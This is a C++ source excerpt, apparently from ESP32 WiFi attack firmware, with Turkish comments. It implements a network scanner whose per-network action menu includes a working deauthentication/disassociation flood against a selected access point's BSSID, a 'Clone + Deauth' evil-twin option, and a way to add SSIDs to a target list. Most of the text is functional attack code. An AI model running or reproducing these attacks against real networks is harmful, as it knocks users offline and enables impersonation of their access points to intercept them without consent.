// Orijinal wifi_scan_run'ın yerini alan gelişmiş versiyon
static void wifi_scan_advanced_run() {
    wifiScanAll(true);
    WiFi.scanDelete();
    if (g_scanResults.empty()) { dispBanner("No networks found"); return; }

    int scroll = 0;
    while (true) {
        // Ana liste
        OptionList nets;
        for (auto& ap : g_scanResults) {
            String label = (ap.ssid.isEmpty() ? "[hidden]" : ap.ssid);
            // Şifreleme sembolü
            if (ap.encType == WIFI_AUTH_OPEN) label += " OPEN";
            else if (ap.encType == WIFI_AUTH_WEP) label += " WEP";
            else label += " WPA";
            label += " " + String(ap.rssi) + "dB";
            nets.push_back({label, [](){}});
        }
        nets.push_back({"[Rescan]", [](){}});
        nets.push_back({"Back", [](){}});

        int sel = loopOptions(nets, "WiFi Scan (" + String(g_scanResults.size()) + ")");
        if (sel < 0 || sel == (int)nets.size()-1) break;
        if (sel == (int)nets.size()-2) { wifiScanAll(true); continue; }

        // Seçili AP için detay + aksiyon menüsü
        APInfo& ap = g_scanResults[sel];
        while (true) {
            dispClear(); dispStatusBar("AP: " + ap.ssid.substring(0,12));
            dispText(0, 12, "SSID: " + (ap.ssid.isEmpty() ? "[hidden]" : ap.ssid.substring(0,18)));
            dispText(0, 22, "BSSID: " + ap.bssid);
            dispText(0, 32, "RSSI: " + String(ap.rssi) + "dBm  Ch:" + String(ap.channel));
            dispText(0, 42, "Enc: " + String(encTypeName(ap.encType)));
            dispText(0, 54, "[BTN] actions [LONG] back");
            dispCommit();
            if (readButtonLong()) break;
            if (!readButton()) { delay(30); continue; }

            // Aksiyon alt menüsü
            OptionList acts = {
                {"Deauth Attack",    [&]() { /* inline */ }},
                {"Clone + Deauth",   [&]() { /* inline */ }},
                {"Add to SSID List", [&]() { /* inline */ }},
                {"Signal Meter",     [&]() { /* inline */ }},
                {"Back", [](){}},
            };
            int act = loopOptions(acts, "Actions");
            if (act < 0 || act == 4) break;
            if (act == 0) {
                // Deauth bu AP'a
                uint8_t bssid[6]; macFromStr(ap.bssid, bssid);
                wifiInitForRawTx();
                uint32_t pkts = 0;
                while (!readButtonLong()) {
                    for (uint8_t b = 0; b < g_cfg.deauthPktsPerBurst; b++)
                        sendDeauthDisassoc(bssid, BROADCAST_MAC, ap.channel);
                    pkts += g_cfg.deauthPktsPerBurst * 4;
                    dispClear(); dispStatusBar("Deauth+Disassoc");
                    dispText(0, 16, ap.ssid.isEmpty() ? "[hidden]" : ap.ssid.substring(0,20));
                    dispText(0, 28, "Frames: " + String(pkts));
                    dispText(0, 42, "[LONG] stop");
                    dispCommit();
                    delay(DEAUTH_INTERVAL_MS);
                }
                esp_wifi_set_promiscuous(false);
                WiFi.mode(WIFI_OFF);
                logPush("[DEAUTH] " + ap.ssid + " frames=" + String(pkts));
                dispBanner("Sent " + String(pkts));
            } else if (act == 1) {
                wifi_ap_clone_run();
            } else if (act == 2) {
                // SSID listesine ekle
                if (g_ssidTargetCount < SSID_LIST_MAX && !ap.ssid.isEmpty()) {
                    bool dup = false;
                    for (uint8_t i = 0; i < g_ssidTargetCount; i++)
                        if (g_ssidTargetList[i] == ap.ssid) { dup = true; break; }
                    if (!dup) {
                        g_ssidTargetList[g_ssidTargetCount++] = ap.ssid;
                        dispBannerOK("Added: " + ap.ssid);
                    } else {
                        dispBannerWarn("Already in list");
                    }
                } else {
                    dispBannerWarn(ap.ssid.isEmpty() ? "Hidden SSID" : "List full");
                }
            } else if (act == 3) {
                marauder_signal_meter_run();
            }
            break;
        }
    }
    WiFi.mode(WIFI_OFF);
}

